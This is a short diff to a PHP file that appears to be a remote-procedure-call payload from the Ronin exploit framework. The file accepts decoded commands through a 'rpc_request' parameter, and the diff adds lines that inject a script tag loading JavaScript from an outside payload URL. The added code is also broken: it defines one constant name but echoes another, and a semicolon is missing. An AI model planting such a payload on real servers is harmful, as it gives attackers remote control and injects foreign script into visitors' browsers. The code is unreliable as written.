@@ -262,6 +262,10 @@ function rpc_call($request)
   }
 }
 
+define('RPC_JAVASCRIPT_URL', 'http://ronin-ruby.github.com/data/ronin-exploits/payloads/php/rpc.js')
+
+echo('<script type="text/javascript" src="' . RPC_JS_URL . '"></script>');
+
 if (isset($_REQUEST['rpc_request']))
 {
   $request  = rawurldecode($_REQUEST['rpc_request']);
